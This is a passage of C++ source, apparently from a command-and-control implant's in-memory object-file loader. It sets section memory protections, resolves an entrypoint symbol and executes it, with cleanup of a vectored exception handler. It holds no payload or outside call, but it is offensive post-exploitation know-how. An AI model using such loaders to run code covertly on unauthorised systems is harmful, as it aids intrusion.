                    if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->sec_map[i].address), &object->sec_map[i].size, protection, nullptr))) {
                        return_defer(ntstatus);
                    }
                }
            }

            if (object->fn_map->size) {
                if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->fn_map), &object->fn_map->size, PAGE_READONLY, nullptr))) {
                    return_defer(ntstatus);
                }
            }

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSymbols; i++) {
                if (object->symbol[i].First.Value[0] != 0) {
                    symbol_name = object->symbol[i].First.Name;
                } else {
                    symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols + object->symbol[i].First.Value[1]);
                }
#if _M_IX86
                if (symbol_name[0] == 0x5F) {
                    symbol_name++;
                }
#endif
                if (x_memcmp(symbol_name, entrypoint, x_strlen(entrypoint)) == 0) {
                    if (!(exec = object->sec_map[object->symbol[i].SectionNumber - 1].address + object->symbol[i].Value)) {
                        return_defer(ERROR_PROC_NOT_FOUND);
                    }
                }
            }

            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                if (U_PTR(exec) >= U_PTR(object->sec_map[i].address) && U_PTR(exec) < U_PTR(object->sec_map[i].address) + object->sec_map[i].size) {

                    object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);
                    if ((object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE) {
                        success = true;
                    }

                    break;
                }
            }

            if (success) {
                const auto entry = R_CAST(obj_entry, exec);
                ExceptionReturn = __builtin_extract_return_addr(__builtin_return_address(0));
                entry(args, size);
            }

            defer:
            if (veh_handler) {
                Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handler);
            }

            return success;
        }
    }
}
